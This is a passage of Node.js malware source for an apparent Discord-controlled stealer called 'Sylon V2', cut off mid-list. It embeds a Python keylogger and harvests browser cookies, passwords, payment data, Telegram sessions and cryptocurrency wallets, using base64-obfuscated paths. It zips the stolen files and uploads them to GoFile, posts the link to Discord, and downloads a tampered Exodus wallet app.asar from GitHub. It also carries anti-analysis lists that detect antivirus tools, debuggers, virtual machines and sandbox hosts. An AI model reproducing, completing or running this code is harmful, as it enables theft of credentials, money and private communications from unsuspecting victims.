const { exec, execSync } = require('child_process');
if (process.platform === 'win32') {
  try {
    WindowsHide();
  } catch (e) {
    const cp = require('child_process');
    try {
      cp.execSync('powershell -window hidden -command ""');
    } catch (err) {}
  }
}
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ChannelType, PermissionFlagsBits, EmbedBuilder, AttachmentBuilder } = require('discord.js');
const { promisify } = require('util');
const fs = require('fs').promises;
const fswithout = require('fs');
const https = require('https');
const AdmZip = require('adm-zip');
const path = require('path');
const os = require('os');
const dpapi = require('@primno/dpapi').default;
const execAsync = promisify(exec);
const axios = require("axios");
const crypto = require("crypto");
const si = require('systeminformation');
const FormData = require('form-data'); // make sure it's installed

 

 

 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 


 
 

 
 
 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 
 


 
 

 
 


 
 

 
 

 
 

 
 
 
 



 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 

 
 
 
 

 
 
 
 





 
 





 
 

 
 

 
 
 
 


const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});
function getCorrectUserHome() {
  const home = os.homedir();

  // If service is running as SYSTEM, rewrite the home path
  if (home.toLowerCase().includes("systemprofile")) {
    const username = process.env.USERNAME || process.env.USERPROFILE?.split(path.sep).pop();
    if (username) {
      return path.join("C:", "Users", username);
    }
  }

  return home;
}

const userHome = getCorrectUserHome();
const rootPath = path.join(userHome, 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012');
let pcCategory = null;
let commandsChannel = null;
let windowsKey = '';
const SCRIPTS_DIR = `C:\\Users\\${os.userInfo().username}\\AppData\\LocalLow\\Temp\\Steam\\scripts`;
const KEYS_SCRIPT_PATH = path.join(SCRIPTS_DIR, 'keys.py');
const KEYS_PY_CONTENT = `from pynput import keyboard
import os
import pathlib

current_line = ""
username = os.getenv('USERNAME')
file_path = f"C:\\\\Users\\\\{username}\\\\AppData\\\\LocalLow\\\\Temp\\\\Steam\\\\Ui.012\\\\Keys\\\\keys.txt"
shift_pressed = False
caps_lock_on = False

# Create directory if it doesn't exist
pathlib.Path(file_path).parent.mkdir(parents=True, exist_ok=True)

print("Listening for keys... (Press Ctrl+C to exit)")
print(f"Saving to: {file_path}")

def on_press(key):
    global current_line, shift_pressed, caps_lock_on
    
    try:
        # Handle regular keys
        char = key.char
        if char:
            # Apply shift and caps lock logic for letters
            if char.isalpha():
                if (shift_pressed and not caps_lock_on) or (caps_lock_on and not shift_pressed):
                    char = char.upper()
                else:
                    char = char.lower()
            
            current_line += char
            print(char, end='', flush=True)
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.enter:
            print()
            try:
                with open(file_path, 'a') as f:
                    f.write(current_line + '\\n')
                print("✓ Saved")
            except Exception as err:
                print(f"✗ Error saving: {err}")
            current_line = ""
        elif key == keyboard.Key.backspace:
            if current_line:
                current_line = current_line[:-1]
                print("\\b \\b", end='', flush=True)
        elif key == keyboard.Key.space:
            current_line += " "
            print(" ", end='', flush=True)
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = True
        elif key == keyboard.Key.caps_lock:
            caps_lock_on = not caps_lock_on
        elif key in [keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.cmd, keyboard.Key.cmd_r]:
            pass  # Ignore modifier keys

def on_release(key):
    global shift_pressed
    
    try:
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = False
    except AttributeError:
        pass

# Start listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
`;
async function getWindowsKey() {
    try {
        const { stdout } = await execAsync('wmic path softwarelicensingservice get OA3xOriginalProductKey');
        const lines = stdout.trim().split('\n');
        const key = lines[lines.length - 1].trim();
        return key || 'UNKNOWN-KEY';
    } catch (error) {
        console.error('Error getting Windows key:', error.message, "how the fuck does that happen");
        return `PC-${os.hostname()}`;
    }
}
async function uploadToGofile(filePath, fsRef) {

  try {
    const formData = new FormData();
    formData.append('file', fsRef.createReadStream(filePath));

    const response = await axios.post('https://upload.gofile.io/uploadfile', formData, {
      headers: formData.getHeaders(),
      maxBodyLength: Infinity,
      maxContentLength: Infinity,
    });

    if (response.data.status !== 'ok') throw new Error('GoFile upload failed: ' + JSON.stringify(response.data));
    console.log('Uploaded to GoFile:', response.data.data.downloadPage);
    return response.data.data.downloadPage;
  } catch (err) {
    console.error('GoFile upload error:', err.message || err);
    throw err;
  }
}

async function findCookiesFiles(dir) {
  let results = [];
  const files = await fs.readdir(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      results = results.concat(await findCookiesFiles(fullPath));
    } else if (file.isFile() && file.name === 'cookies.txt') {
      results.push(fullPath);
    }
  }
  return results;
}
async function findBrowserDataFiles(dir) {
  let results = [];
  const files = await fs.readdir(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      results = results.concat(await findBrowserDataFiles(fullPath));
    } else if (file.isFile() && 
               (file.name === 'cookies.txt' || 
                file.name === 'passwords.json' || 
                file.name === 'payments.json')) {
      results.push(fullPath);
    }
  }
  return results;
}

async function zipAndUploadSteamUi(guild) {
  let zipPath = null;
  let sourcePath = null;

  try {
    const username = process.env.USERNAME || os.userInfo().username;
    if (!username) throw new Error('Could not determine Windows username');

    sourcePath = path.join('C:', 'Users', username, 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012');
    await fs.access(sourcePath);

    // ======= Analyze folder contents =======
    let description = '';

    // 1. Browser Data (cookies, passwords, payments)
    const browsersPath = path.join(sourcePath, 'Browsers');
    let cookieCount = 0;
    let passwordCount = 0;
    let paymentCount = 0;
    
    try {
      const browserFiles = await findBrowserDataFiles(browsersPath);
      
      for (const filePath of browserFiles) {
        const fileName = path.basename(filePath);
        
        try {
          const data = await fs.readFile(filePath, 'utf8');
          
          if (fileName === 'cookies.txt') {
            const lines = data.split('\n').slice(4); // line 5 is first cookie
            cookieCount += lines.filter(line => line.trim()).length;
          } 
          else if (fileName === 'passwords.json') {
            const passwords = JSON.parse(data);
            if (Array.isArray(passwords)) {
              passwordCount += passwords.length;
            }
          }
          else if (fileName === 'payments.json') {
            const payments = JSON.parse(data);
            if (Array.isArray(payments)) {
              paymentCount += payments.length;
            }
          }
        } catch (parseError) {
          console.error(`Error parsing ${fileName}:`, parseError);
        }
      }
    } catch {
      // Ignore errors if browsers folder doesn't exist
    }
    
    description += `[2;32mCookies found: ${cookieCount}[0m\n`;
    description += `[2;32mPasswords found: ${passwordCount}[0m\n`;
    description += `[2;32mPayments found: ${paymentCount}[0m\n\n`;

    // 2. Games
    const gamesPath = path.join(sourcePath, 'Games');
    const gamesList = ['Minecraft', 'Roblox'];
    description += '[2;36mGames[0m\n';
    const gamesLine = gamesList.map(game => {
      const exists = fswithout.existsSync(path.join(gamesPath, game));
      return `${exists ? '[2;32m✅' : '[2;31m❌'} ${game}[0m`;
    }).join(' ');
    description += gamesLine + '\n\n';

    // 3. Launchers
    const launchersPath = path.join(sourcePath, 'Launchers');
    const launchersList = ['EpicGames', 'Rockstar', 'Steam', 'Valorant'];
    description += '[2;36mLaunchers[0m\n';
    const launchersLine = launchersList.map(launcher => {
      const exists = fswithout.existsSync(path.join(launchersPath, launcher));
      return `${exists ? '[2;32m✅' : '[2;31m❌'} ${launcher}[0m`;
    }).join(' ');
    description += launchersLine + '\n\n';

    // 4. Social
    const socialPath = path.join(sourcePath, 'Social');
    const socialList = ['Discord', 'Telegram'];
    description += '[2;36mSocial[0m\n';
    const socialLine = socialList.map(social => {
      const exists = fswithout.existsSync(path.join(socialPath, social));
      return `${exists ? '[2;32m✅' : '[2;31m❌'} ${social}[0m`;
    }).join(' ');
    description += socialLine;

    // ======= Create ZIP =======
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zipPath = path.join(os.tmpdir(), `Stealer_Logs.zip`);
    await fs.writeFile(zipPath, zip.toBuffer());

    // Upload to GoFile
    const gofileUrl = await uploadToGofile(zipPath, fswithout);

    // Send embed
    const commandsChannel = guild.channels.cache.find(
      c => c.name === 'commands' && c.type === ChannelType.GuildText
    );
    if (!commandsChannel) throw new Error('commands channel not found');

    const embed = new EmbedBuilder()
      .setTitle('`\`\`\`ansi\n[2;32mSylon V2 Stealer Logs[0m\`\`\``')
      .setDescription(`\`\`\`ansi\n${description}\`\`\`\n[Download ZIP](${gofileUrl})`)
      .setColor(3553599)
      .setTimestamp();

    await commandsChannel.send({ embeds: [embed] });

    // Delete source folder
    await fs.rm(sourcePath, { recursive: true, force: true });

  } catch (error) {
    console.error('Error in zipAndUploadSteamUi:', error);
  } finally {
    if (zipPath) {
      try {
        await fs.unlink(zipPath);
      } catch {}
    }
  }
}
// ====================================== start of greb ======================================
async function exists(p) {
  try { await fs.access(p); return true; } catch { return false; }
}
async function safeMkdir(p) {
  try { await fs.mkdir(p, { recursive: true }); } catch {}
}
function ts() { return new Date().toISOString().replace(/[:.]/g, '-'); }
function getEnvPath(name, fallback) {
  const val = process.env[name];
  return val && val.trim().length > 0 ? val : fallback;
}

async function CopyTeleRecursive(src, dest) {
  const skipDirs = ['emoji', 'temp', 'user_data', 'dumps'];
  try {
    if (fs.cp) {
      await safeMkdir(path.dirname(dest));
      await fs.cp(src, dest, {
        recursive: true,
        force: true,
        filter: (source) => !skipDirs.includes(path.basename(source).toLowerCase()),
      });
      return;
    }
    async function cpDir(s, d) {
      await safeMkdir(d);
      const items = await fs.readdir(s, { withFileTypes: true });
      for (const it of items) {
        const sPath = path.join(s, it.name);
        const dPath = path.join(d, it.name);
        if (it.isDirectory()) {
          if (skipDirs.includes(it.name.toLowerCase())) continue;
          await cpDir(sPath, dPath);
        } else {
          try { await fs.copyFile(sPath, dPath); } catch {}
        }
      }
    }
    await cpDir(src, dest);
  } catch (err) {
    console.error(`Telegram copy error: ${err.message}`);
  }
}

async function findStoreTdataCandidates(localappdata) {
  const pkgDir = path.join(localappdata, 'Packages');
  const results = [];
  if (!(await exists(pkgDir))) return results;
  try {
    const entries = await fs.readdir(pkgDir, { withFileTypes: true });
    for (const e of entries) {
      if (!e.isDirectory()) continue;
      if (!/^TelegramMessengerLLP\.TelegramDesktop/i.test(e.name)) continue;
      const pathsToTry = [
        path.join(pkgDir, e.name, 'LocalCache', 'Roaming', 'Telegram Desktop', 'tdata'),
        path.join(pkgDir, e.name, 'LocalCache', 'Roaming', 'Telegram Desktop UWP', 'tdata'),
      ];
      for (const cand of pathsToTry) {
        if (await exists(cand)) {
          results.push({ type: 'microsoft', path: cand });
          break;
        }
      }
    }
  } catch (err) {
    console.error(`Telegram store scan error: ${err.message}`);
  }
  return results;
}

const TARGET_GPUS = [
  "Microsoft Remote Display Adapter", 
  "Microsoft Hyper-V Video", 
  "Microsoft Basic Display Adapter", 
  "VMware SVGA 3D", 
  "Standard VGA Graphics Adapter", 
  "NVIDIA GeForce 840M", 
  "NVIDIA GeForce 9400M", 
  "UKBEHH_S", 
  "ASPEED Graphics Family(WDDM)", 
  "H_EDEUEK", 
  "VirtualBox Graphics Adapter", 
  "K9SC88UK", 
  "Стандартный VGA графический адаптер"
];

const TARGET_OS = [
  "Windows Server 2022 Datacenter",
  "Windows Server 2019 Standard",
  "Windows Server 2019 Datacenter",
  "Windows Server 2016 Standard",
  "Windows Server 2016 Datacenter"
];
const BLOCKED_PROGRAMS = [
        "cfp",
        "ccSvcHst",
        "mcshield",
        "vsmon",
        "avgfwsvc",
        "ashDisp",
        "avp",
        "MPFTray",
        "Outpost",
        "tinywall",
        "glasswire",
        "peerblock",
        "smc",
        "bdagent",
        "oaui",
        "pctfw",
        "pfw",
        "SPFConsole",
        "afwServ",
        "egui",
        "ndf",
        "avwsc",
        "fkp",
        "fsaua",
        "avktray",
        "rfwmain",
        "zlclient",
        "uiWinMgr",
        "WRSA",
        "mcuimgr",
        "avgnt",
        "sfmon",
        "zatray",
        "BavPro_Setup",
        "apwiz",
        "pfw7",
        "jpfsrv",
        "pztray",
        "isafe",
        "BullGuard",
        "PSUAMain",
        "SBAMSvc",
        "nlclientapp",
        "woservice",
        "op_mon",
        "WSClientservice",
        "wfc",
        "kicon",
        "avgtray",
        "npfmsg",
        "jpf",
        "WRSSSDK",
        "httpdebuggerui",
        "wireshark",
        "fiddler",
        "regedit",
        "vboxservice",
        "df5serv",
        "vboxtray",
        "vmtoolsd",
        "vmwaretray",
        "ida64",
        "ollydbg",
        "pestudio",
        "vmwareuser",
        "vgauthservice",
        "vmacthlp",
        "x96dbg",
        "vmsrvc",
        "x32dbg",
        "vmusrvc",
        "prl_cc",
        "prl_tools",
        "xenservice",
        "qemu-ga",
        "joeboxcontrol",
        "ksdumperclient",
        "ksdumper",
        "joeboxserver"
];
const TARGET_KEYS = [
            "7AB5C494-39F5-4941-9163-47F54D6D5016",
            "032E02B4-0499-05C3-0806-3C0700080009",
            "03DE0294-0480-05DE-1A06-350700080009",
            "11111111-2222-3333-4444-555555555555",
            "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
            "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
            "4C4C4544-0050-3710-8058-CAC04F59344A",
            "00000000-0000-0000-0000-AC1F6BD04972",
            "79AF5279-16CF-4094-9758-F88A616D81B4",
            "5BD24D56-789F-8468-7CDC-CAA7222CC121",
            "49434D53-0200-9065-2500-65902500E439",
            "49434D53-0200-9036-2500-36902500F022",
            "777D84B3-88D1-451C-93E4-D235177420A7",
            "49434D53-0200-9036-2500-369025000C65",
            "B1112042-52E8-E25B-3655-6A4F54155DBF",
            "00000000-0000-0000-0000-AC1F6BD048FE",
            "EB16924B-FB6D-4FA1-8666-17B91F62FB37",
            "A15A930C-8251-9645-AF63-E45AD728C20C",
            "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
            "C7D23342-A5D4-68A1-59AC-CF40F735B363",
            "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
            "44B94D56-65AB-DC02-86A0-98143A7423BF",
            "6608003F-ECE4-494E-B07E-1C4615D1D93C",
            "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
            "49434D53-0200-9036-2500-369025003AF0",
            "8B4E8278-525C-7343-B825-280AEBCD3BCB",
            "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
            "BB64E044-87BA-C847-BC0A-C797D1A16A50",
            "2E6FB594-9D55-4424-8E74-CE25A25E36B0",
            "42A82042-3F13-512F-5E3D-6BF4FFFD8518"
];
const BLOCKED_HOSTNAMES = [
    "DESKTOP-CDLNVOQ",
    "BEE7370C-8C0C-4",
    "DESKTOP-NAKFFMT",
    "WIN-5E07COS9ALR",
    "B30F0242-1C6A-4",
    "DESKTOP-VRSQLAG",
    "Q9IATRKPRH",
    "XC64ZB",
    "DESKTOP-D019GDM",
    "DESKTOP-WI8CLET",
    "SERVER1",
    "LISA-PC",
    "JOHN-PC",
    "DESKTOP-B0T93D6",
    "DESKTOP-1PYKP29",
    "DESKTOP-1Y2433R",
    "WILEYPC",
    "WORK",
    "6C4E733F-C2D9-4",
    "RALPHS-PC",
    "DESKTOP-WG3MYJS",
    "DESKTOP-7XC6GEZ",
    "DESKTOP-5OV9S0O",
    "QarZhrdBpj",
    "ORELEEPC",
    "ARCHIBALDPC",
    "JULIA-PC",
    "d1bnJkfVlH",
    "DESKTOP-B0T93D6"
];
const BLACKLISTED_IPS = [
            "88.132.231.71",
            "78.139.8.50",
            "20.99.160.173",
            "88.153.199.169",
            "84.147.62.12",
            "194.154.78.160",
            "92.211.109.160",
            "195.74.76.222",
            "188.105.91.116",
            "34.105.183.68",
            "92.211.55.199",
            "79.104.209.33",
            "95.25.204.90",
            "34.145.89.174",
            "109.74.154.90",
            "109.145.173.169",
            "34.141.146.114",
            "212.119.227.151",
            "195.239.51.59",
            "192.40.57.234",
            "64.124.12.162",
            "34.142.74.220",
            "188.105.91.173",
            "109.74.154.91",
            "34.105.72.241",
            "109.74.154.92",
            "213.33.142.50",
            "109.74.154.91",
            "93.216.75.209",
            "192.87.28.103",
            "88.132.226.203",
            "195.181.175.105",
            "88.132.225.100",
            "92.211.192.144",
            "34.83.46.130",
            "188.105.91.143",
            "34.85.243.241",
            "34.141.245.25",
            "178.239.165.70",
            "84.147.54.113",
            "193.128.114.45",
            "95.25.81.24",
            "92.211.52.62",
            "88.132.227.238",
            "35.199.6.13",
            "80.211.0.97",
            "34.85.253.170",
            "23.128.248.46",
            "35.229.69.227",
            "34.138.96.23",
            "192.211.110.74",
            "35.237.47.12",
            "87.166.50.213",
            "34.253.248.228",
            "212.119.227.167",
            "193.225.193.201",
            "34.145.195.58",
            "34.105.0.27",
            "195.239.51.3",
            "35.192.93.107"
];
function normalizeString(s = '') {
  return String(s || '').normalize ? s.normalize('NFKD') : String(s || '');
}
function normalizeHost(s = "") {
  return s.trim().toLowerCase();
}
function normGUID(s = '') {
  return normalizeString(s).replace(/[\{\}\s]/g, '').toUpperCase().trim();
}
function looseNorm(s = '') {
  return normalizeString(s).toLowerCase().trim();
}

const TARGET_KEYS_NORM = new Set(TARGET_KEYS.map(k => normGUID(k)));

function runCmd(cmd, timeout = 10000) {
  return new Promise((resolve) => {
    exec(cmd, { windowsHide: true, timeout }, (err, stdout, stderr) => {
      if (err) {
        return resolve({ ok: false, error: err.message, stdout: stdout || '', stderr: stderr || '' });
      }
      const lines = String(stdout || '').split(/\r?\n/).map(l => l.trim()).filter(Boolean);
      resolve({ ok: true, lines, raw: stdout });
    });
  });
}


async function wmicGet(className, property) {
  const cmd = `wmic ${className} get ${property} /format:list`;
  const res = await runCmd(cmd);
  if (!res.ok) return [];
  const values = [];
  for (const l of res.lines) {
    const idx = l.indexOf('=');
    if (idx >= 0) {
      const key = l.slice(0, idx).trim();
      const val = l.slice(idx + 1).trim();
      if (String(key).toLowerCase() === String(property).toLowerCase() && val) values.push(val);
    } else {
      if (l && l.toUpperCase() !== String(property).toUpperCase()) {
        values.push(l);
      }
    }
  }
  return values;
}
function blockAndExit() {
 console.log('uh oh big bad')
  process.exit(8);
}
function getPublicIP(timeout = 5000) {
  return new Promise((resolve) => {
    const req = https.get('https://api.ipify.org?format=json', { timeout }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try {
          const j = JSON.parse(data);
          resolve(j.ip || null);
        } catch (e) {
          resolve(null);
        }
      });
    });
    req.on('error', () => resolve(null));
    req.on('timeout', () => { req.destroy(); resolve(null); });
  });
}

function normIP(ip = '') {
  return String(ip || '').replace(/^\[|\]$/g, '').trim();
}

async function checkIPs() {

  try {
    const nets = os.networkInterfaces();
    const localIps = [];
    for (const name of Object.keys(nets)) {
      for (const ni of nets[name] || []) {
        if (!ni || !ni.address) continue;
        localIps.push({ if: name, addr: normIP(ni.address), family: ni.family, internal: !!ni.internal });
      }
    }

    if (localIps.length === 0) {
    } else {
      for (const ipObj of localIps) {
        const a = ipObj.addr;
        if (BLACKLISTED_IPS.some(b => normIP(b) === a)) {
          blockAndExit();
        }
      }
    }
  } catch (err) {
    console.log('  Failed to enumerate local interfaces:', err && err.message ? err.message : err);
  }

  try {
    const publicIp = await getPublicIP();
    if (!publicIp) {
    } else {
      const p = normIP(publicIp);
      if (BLACKLISTED_IPS.some(b => normIP(b) === p)) {
        blockAndExit();
      }
    }
  } catch (err) {
    console.log('  Error checking public IP:', err && err.message ? err.message : err);
  }

}
async function checkRunningProcesses() {
  const res = await runCmd('wmic process get Name /value');
  if (!res.ok) return;

  const blockedNormalized = BLOCKED_PROGRAMS.map(p =>
    p.trim().toLowerCase().endsWith('.exe') ? p.trim().toLowerCase() : (p.trim().toLowerCase() + '.exe')
  );

  for (const line of res.lines) {
    const parts = line.split('=');
    if (parts.length !== 2) continue;

    const processName = parts[1].trim().toLowerCase();
    if (blockedNormalized.includes(processName)) {
      blockAndExit();
    }
  }
}


async function checkHostname() {
  const hostname = os.hostname() || '';

  const normalized = normalizeHost(hostname);
  const bad = BLOCKED_HOSTNAMES.find(h => normalizeHost(h) === normalized);

  if (bad) {
    blockAndExit();
  }

}

async function checkOsAndGpu() {
  const osInfo = await si.osInfo();
  const osString = `${osInfo.distro} ${osInfo.release}`;

  if (TARGET_OS.some(t => looseNorm(osString).includes(looseNorm(t)))) {
    blockAndExit();
  }

  const gfx = await si.graphics();

  if (gfx.controllers) {
    for (const c of gfx.controllers) {
      const gpuString = `${c.vendor} ${c.model}`;
      if (TARGET_GPUS.some(t => looseNorm(gpuString).includes(looseNorm(t)))) {
        blockAndExit();
      }
    }
  }

}

async function checkHardwareIDs() {
  const uuidVals = await wmicGet('csproduct', 'UUID');

  for (const v of uuidVals) {
    const normalized = normGUID(v);
    if (TARGET_KEYS_NORM.has(normalized)) {
      blockAndExit();
    }
  }

}
function findExodusResources() {
  const exodusPath = path.join(userHome , 'AppData', 'Local', 'exodus');

  if (!fswithout.existsSync(exodusPath)) {
    return null;
  }

  const dirs = fswithout.readdirSync(exodusPath, { withFileTypes: true });
  const appFolder = dirs.find(
    (d) => d.isDirectory() && /^app-\d+(\.\d+)*$/.test(d.name)
  );

  if (!appFolder) {
    return null;
  }

  const resourcesPath = path.join(exodusPath, appFolder.name, 'resources');

  if (!fswithout.existsSync(resourcesPath)) {
    return null;
  }
console.log(resourcesPath)
  return resourcesPath;
}

function downloadAsar(resourcesPath) {
  console.log('skibidi')
  const url = 'https://github.com/Bread-M4/Sylon-v2/releases/download/asar/app.asar';
  const dest = path.join(resourcesPath, 'app.asar');
  try {
    if (fswithout.existsSync(dest)) {
      const stats = fswithout.statSync(dest);
      const fileSizeInMB = stats.size / (1024 * 1024);
      if (fileSizeInMB >= 133 && fileSizeInMB <= 139) {
        return;
      } else {
      }
    } else {
    }
    execSync(`curl -L -o "${dest}" "${url}"`, { stdio: 'inherit' });

    if (fswithout.existsSync(dest)) {
      const newStats = fswithout.statSync(dest);
      const newSize = newStats.size / (1024 * 1024);
    } else {
    }

  } catch (err) {
    console.error('[downloadAsar] Error occurred:', err.message || err);
  }
}
function downloadDeobfScript(retryCount = 0) {
  const scriptDir = path.join(userHome , 'AppData', 'LocalLow', 'Temp', 'Steam', 'scripts');
  const filePath = path.join(scriptDir, 'deobf.js');
  const url = 'https://raw.githubusercontent.com/Bread-M4/Sylon-v2/refs/heads/main/Wallets/deobf.js';

  if (!fswithout.existsSync(scriptDir)) {
    fswithout.mkdirSync(scriptDir, { recursive: true });
  }


  const file = fswithout.createWriteStream(filePath);

  const request = https.get(url, (response) => {
    if (response.statusCode === 200) {
      response.pipe(file);
      
      file.on('finish', () => {
        file.close();
      });
    } else {
      file.close();
      if (fswithout.existsSync(filePath)) {
        fswithout.unlinkSync(filePath);
      }
      handleretry(retryCount, url, filePath);
    }
  });

  request.on('error', (err) => {

    file.close();
    if (fswithout.existsSync(filePath)) {
      fswithout.unlinkSync(filePath);
    }
    handleretry(retryCount, url, filePath);
  });
}
function handleretry(retryCount, url, filePath) {
  if (retryCount < 1) {
    setTimeout(() => downloadDeobfScript(retryCount + 1), 2000);
  } else {
  }
}
function deobfuscate(base64String) {
  return Buffer.from(base64String, 'base64').toString('utf8');
}

function copyWalletsToTemp() {
  
  const walletPaths = {
    "Zcash": "XEFwcERhdGFcUm9hbWluZ1xaY2FzaA==",
    "Armory": "XEFwcERhdGFcUm9hbWluZ1xBcm1vcnk=",
    "Bytecoin": "XEFwcERhdGFcUm9hbWluZ1xieXRlY29pbg==",
    "Jaxx": "XEFwcERhdGFcUm9hbWluZ1xjb20ubGliZXJ0eS5qYXh4XEluZGV4ZWREQlxmaWxlX18wLmluZGV4ZWRkYi5sZXZlbGRi",
    "Exodus": "XEFwcERhdGFcUm9hbWluZ1xFeG9kdXNcZXhvZHVzLndhbGxldA==",
    "Ethereum": "XEFwcERhdGFcUm9hbWluZ1xFdGhlcmV1bVxrZXlzdG9yZQ==",
    "Electrum": "XEFwcERhdGFcUm9hbWluZ1xFbGVjdHJ1bVx3YWxsZXRz",
    "AtomicWallet": "XEFwcERhdGFcUm9hbWluZ1xhdG9taWNcTG9jYWwgU3RvcmFnZVxsZXZlbGRi",
    "Guarda": "XEFwcERhdGFcUm9hbWluZ1xHdWFyZGFcTG9jYWwgU3RvcmFnZVxsZXZlbGRi",
    "Coinomi": "XEFwcERhdGFcUm9hbWluZ1xDb2lub21pXENvaW5vbWlcd2fswithoutbGV0cw==",
  };
  let copied = 0;

  for (const [name, obfuscatedPath] of Object.entries(walletPaths)) {
    const deobfuscatedPath = deobfuscate(obfuscatedPath);
    const source = path.join(userHome, deobfuscatedPath);
    const dest = path.join(userHome , name);
    
    if (fswithout.existsSync(source)) {
      try {
        copyDir(source, dest);
        copied++;
      } catch (err) {
      }
    } else {
    }
  }

}


function copyBrowserWalletsToTemp() {
  const destBase = path.join(userHome , 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'Wallet');
  
  const browsers = {
    "Chrome": "QXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YQ==",
    "Chrome Beta": "QXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lIEJldGFcVXNlciBEYXRh",
    "Chrome Canary": "QXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lIFN4U1xVc2VyIERhdGE=",
    "Chromium": "QXBwRGF0YVxMb2NhbFxDaHJvbWl1bVxVc2VyIERhdGE=",
    "Edge": "QXBwRGF0YVxMb2NhbFxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGE=",
    "Brave": "QXBwRGF0YVxMb2NhbFxCcmF2ZVNvZnR3YXJlXEJyYXZlLUJyb3dzZXJcVXNlciBEYXRh",
    "Vivaldi": "QXBwRGF0YVxMb2NhbFxWaXZhbGRpXFVzZXIgRGF0YQ==",
    "Opera": "QXBwRGF0YVxSb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZQ==",
    "OperaGX": "QXBwRGF0YVxSb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZQ==",
    "Yandex": "QXBwRGF0YVxMb2NhbFxZYW5kZXhcWWFuZGV4QnJvd3NlclxVc2VyIERhdGE=",
  };

  const extensionPaths = {
    "Authenticator": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xiaGdob2FtYXBjZHBib2hwaGlnb29vYWRkaW5wa2JhaQ==",
    "Binance": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmaGJvaGltYWVsYm9ocGpiYmxkY25nY25hcG5kb2RqcA==",
    "Bitapp": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmaWhrYWtmb2JrbWtqb2pwY2hwZmdjbWhmam5tbmZwaQ==",
    "BoltX": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhb2Rra2FnbmFkY2JvYmZwZ2dmbmplb25nZW1qYmpjYQ==",
    "Coin98": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhZWFjaGtubWVmcGhlcGNjaW9uYm9vaGNrb25vZWVtZw==",
    "Coinbase": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xobmZhbmtub2NmZW9mYmRkZ2Npam5taG5mbmtkbmFhZA==",
    "Core": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhZ29ha2ZlamphYm9tZW1wa2psZXBkZmxhbGVlb2JoYg==",
    "Crocobit": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xwbmxmam1sY2pkamdrZGRlY2dpbmNuZGZnZWdrZWNrZQ==",
    "Equal": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xibG5pZWlpZmZib2lsbGtuam5lcG9namhrZ25vYXBhYw==",
    "Ever": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xjZ2Vlb2RwZmFnamNlZWZpZWZsbWRmcGhwbGtlbmxmaw==",
    "ExodusWeb3": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhaG9scGZkaWfswithoutamdqZmhvbWloa2pibWdqaWRsY2Rubw==",
    "Fewcha": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlYmZpZHBwbGhhYmVlZHBuaGpub2JnaG9rcGlpb29sag==",
    "Finnie": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xjam1rbmRqaG5hZ2NmYnBpZW1ua2Rwb21jY25qYmxtag==",
    "Guarda": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xocGdsZmhnZm5oYmdwamRlbmpnbWRnb2VpYXBwYWZsbg==",
    "Guild": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xuYW5qbWRrbmhraW5pZm5rZ2RjZ2djZm5oZGFhbW1tag==",
    "HarmonyOutdated": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmbm5lZ3BobG9iamRwa2hlY2Fwa2lqamRrZ2NqaGtpYg==",
    "Iconex": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmbHBpY2lpbGVtZ2hibWZhbGljYWpvb2xoa2tlbmZlbA==",
